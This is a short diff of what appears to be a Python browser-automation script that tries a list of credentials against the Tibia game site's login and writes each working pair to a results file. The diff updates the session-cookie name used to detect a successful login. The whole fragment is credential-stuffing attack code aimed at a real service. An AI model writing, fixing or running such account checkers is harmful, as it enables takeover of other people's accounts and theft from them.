@@ -67,11 +67,10 @@ for credential in credentials:
     
     signInButton.click()
 
-    cookie = browser.get_cookie('DM_SessionID')
+    cookie = browser.get_cookie('SecureSessionID')
 
     browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
 
     if cookie != None:
         saveCredntialResultToFile(credential,"results.txt")
-    browser.quit()
     
